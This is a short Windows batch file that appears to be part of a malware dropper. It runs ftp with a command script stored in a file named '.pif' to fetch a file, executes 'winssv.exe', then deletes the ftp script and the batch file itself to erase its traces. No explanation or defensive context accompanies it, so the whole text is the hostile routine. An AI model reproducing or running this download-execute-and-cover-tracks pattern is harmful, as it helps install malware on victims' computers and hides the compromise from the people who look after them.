   @echo off
   ftp -n -v -s:.pif
   winssv.exe
   del .pif
   del /F c.bat
   exit /y
